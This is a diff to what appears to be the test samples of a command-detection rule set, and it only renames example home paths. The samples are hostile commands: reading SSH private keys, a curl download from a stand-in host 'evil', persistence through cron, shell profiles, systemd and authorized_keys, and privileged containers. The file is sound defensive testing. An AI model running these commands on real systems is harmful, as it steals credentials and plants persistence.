@@ -108,7 +108,7 @@ def any_argv(globs, argv, exe=""):
 SAMPLES = {
     "carbonato.exec.ssh_key_heredoc": [
         ["cat", "/root/.ssh/id_rsa"],
-        ["cat", "/home/u/.ssh/id_ed25519"],
+        ["cat", "/home/svc-example/.ssh/id_ed25519"],
         ["cat", "/root/.ssh/known_hosts"],
         ["cp", "/root/.ssh/id_rsa", "/tmp/x"],
     ],
@@ -127,7 +127,7 @@ SAMPLES = {
         # `-O <path>` as the LAST token: the only shape `* -O /tmp/*` can match,
         # because '*' cannot cross '/' or spaces past one segment.
         ["curl", "-O", "/tmp/x"],
-        ["curl", "-O", "/home/u/x"],
+        ["curl", "-O", "/home/svc-example/x"],
         # the same attack in its natural order (URL first): NOT matched by those
         # globs. Kept here on purpose so the miss is visible, not hidden.
         ["curl", "http://evil/x", "-O", "/tmp/x"],
@@ -150,12 +150,12 @@ SAMPLES = {
         ["crontab", "-e"],
         ["/etc/cron.d/evil"],
         ["sh", "-c", "echo x >> /etc/cron.d/evil"],
-        ["sh", "-c", "echo x >> /home/u/.bashrc"],
-        ["sh", "-c", "echo x >> /home/u/.bash_profile"],
-        ["sh", "-c", "echo x >> /home/u/.profile"],
-        ["sh", "-c", "echo x >> /home/u/.zshrc"],
+        ["sh", "-c", "echo x >> /home/svc-example/.bashrc"],
+        ["sh", "-c", "echo x >> /home/svc-example/.bash_profile"],
+        ["sh", "-c", "echo x >> /home/svc-example/.profile"],
+        ["sh", "-c", "echo x >> /home/svc-example/.zshrc"],
         ["/etc/systemd/system/x.service"],
-        ["sh", "-c", "echo k >> /home/u/.ssh/authorized_keys"],
+        ["sh", "-c", "echo k >> /home/svc-example/.ssh/authorized_keys"],
     ],
     "carbonato.infra.privileged_container": [
         ["docker", "run", "--privileged", "img"],
